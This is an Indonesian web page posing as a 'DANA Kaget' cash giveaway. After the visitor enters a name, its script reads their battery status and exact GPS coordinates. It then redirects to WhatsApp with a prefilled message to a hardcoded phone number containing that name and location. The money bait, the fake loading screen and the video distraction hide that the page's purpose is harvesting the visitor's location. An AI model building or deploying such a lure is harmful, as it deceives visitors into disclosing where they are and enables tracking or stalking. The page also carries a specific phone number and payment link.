<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sebar DANA Kaget!</title>
    <meta name="description" content="Halaman web menampilkan info DANA Kaget lalu mengarahkan ke WhatsApp setelah jeda video dan loading. Menampilkan info baterai dan lokasi (jika diizinkan) dengan menyertakan nama.">
    <meta name="keywords" content="dana kaget, whatsapp, langsung kirim, loading, video, baterai, lokasi, nama">
    <meta name="author" content="AI Assistant">
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f8f9fa;
        }

        .container {
            text-align: center;
            padding: 30px;
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .dana-info {
            font-size: 1.2em;
            color: #28a745;
            margin-bottom: 15px;
        }

        .redirect-info {
            font-size: 0.9em;
            color: #6c757d;
            margin-top: 10px;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        input[type="text"] {
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }

        button {
            padding: 10px 20px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #218838;
        }

        .loading-container {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }

        .loading-bar {
            width: 100%;
            height: 10px;
            background-color: #e9ecef;
            border-radius: 5px;
            overflow: hidden;
            margin-bottom: 5px;
        }

        .loading-progress {
            height: 100%;
            width: 0%;
            background-color: #007bff;
            border-radius: 5px;
        }

        .loading-text {
            font-size: 0.8em;
            color: #6c757d;
        }

        .video-container {
            display: none;
            margin-bottom: 15px;
        }

        video {
            max-width: 100%;
            height: auto;
        }

        .info-container {
            margin-top: 15px;
            font-size: 0.8em;
            color: #6c757d;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ISYA CO, JANGAN LUPA SOLAT ABIS ITU MAKAN</h2>
        <form id="dana-form">
            <label for="nama">Nama Kamu : </label>
            <input type="text" id="nama" name="nama" required>

            <button type="submit" id="submit-btn">Kirim ke WhatsApp</button>
        </form>

        <div class="video-container" id="video-container">
            <video id="narsis-video" src="https://e.top4top.io/m_3390gfh1p0.mp4" controls width="320" height="240"></video>
        </div>

        <div class="loading-container" id="loading-container">
            <div class="loading-bar">
                <div class="loading-progress" id="loading-progress"></div>
            </div>
            <p class="loading-text">Tunggu sebentar, narsis dulu 🤣</p>
        </div>

        <div class="info-container" id="info-container">
            <p id="battery-info">Memuat info baterai...</p>
            <p id="location-info">Memuat info lokasi...</p>
        </div>

        <p class="redirect-info">nara zaen</p>
    </div>

    <script type="text/javascript">
        const form = document.getElementById('dana-form');
        const submitBtn = document.getElementById('submit-btn');
        const videoContainer = document.getElementById('video-container');
        const narsisVideo = document.getElementById('narsis-video');
        const loadingContainer = document.getElementById('loading-container');
        const loadingProgress = document.getElementById('loading-progress');
        const whatsappNumber = "+6285711374861";
        const linkDanaKaget = "https://link.dana.id/danakaget?c=sk2732hff&r=cAYM8h&orderId=20250518101214188315010300166998223298664";
        const videoDuration = 10000; // 10 detik
        const loadingDuration = 1000; // Durasi animasi loading (bisa disesuaikan)
        const batteryInfoElement = document.getElementById('battery-info');
        const locationInfoElement = document.getElementById('location-info');
        let batteryLevel = 'Tidak tersedia';
        let isCharging = 'Tidak tersedia';
        let latitude = 'Tidak tersedia';
        let longitude = 'Tidak tersedia';

        // Mendapatkan informasi baterai
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                batteryLevel = (battery.level * 100).toFixed(0) + '%';
                isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
                updateInfoDisplay();

                battery.addEventListener('levelchange', () => {
                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
                    updateInfoDisplay();
                });

                battery.addEventListener('chargingchange', () => {
                    isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
                    updateInfoDisplay();
                });
            }).catch(error => {
                batteryInfoElement.textContent = 'Info baterai tidak tersedia.';
                console.error('Gagal mendapatkan info baterai:', error);
            });
        } else {
            batteryInfoElement.textContent = 'Fitur info baterai tidak didukung.';
        }

        // Mendapatkan informasi lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                latitude = position.coords.latitude.toFixed(6);
                longitude = position.coords.longitude.toFixed(6);
                updateInfoDisplay();
            }, error => {
                locationInfoElement.textContent = 'Akses lokasi ditolak atau tidak tersedia.';
                console.error('Gagal mendapatkan lokasi:', error);
            });
        } else {
            locationInfoElement.textContent = 'Fitur lokasi tidak didukung.';
        }

        function updateInfoDisplay() {
            batteryInfoElement.textContent = `Baterai: ${batteryLevel}, Status: ${isCharging}`;
            locationInfoElement.textContent = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
        }

        submitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            const nama = document.getElementById('nama').value;
            const batteryText = `Info Baterai: ${batteryLevel}, Status: ${isCharging}`;
            const locationText = `Lokasi: Lat ${latitude}, Lon ${longitude}`;

            // Sembunyikan form dan tampilkan video
            form.style.display = 'none';
            videoContainer.style.display = 'block';
            loadingContainer.style.display = 'flex';
            narsisVideo.play();

            let progress = 0;
            const interval = 20; // Interval update loading bar (ms)
            const steps = videoDuration / interval;
            let currentStep = 0;

            const loadingInterval = setInterval(() => {
                currentStep++;
                progress = (currentStep / steps) * 100;
                loadingProgress.style.width = `${progress}%`;
                if (progress >= 100) {
                    clearInterval(loadingInterval);
                }
            }, interval);

            // Setelah video selesai (atau durasi yang ditentukan), redirect ke WhatsApp
            setTimeout(() => {
                narsisVideo.pause();
                const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nSAVE NOMER GUA ANJAY 🤤`;
                const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
                window.location.href = whatsappUrl;
            }, videoDuration);
        });

        narsisVideo.addEventListener('ended', () => {
            // Jika video selesai sebelum timeout (opsional)
            clearTimeout(redirectTimeout);
            const nama = document.getElementById('nama').value;
            const batteryText = `Baterai ku sisa ${batteryLevel} nara, dan ${isCharging}`;
            const locationText = `Lokasi ku mungkin disini ${latitude}, ${longitude} 🤣`;
            const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nSave No Gua Anjay 🤤`;
            const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
            window.location.href = whatsappUrl;
        });
    </script>
</body>
</html>
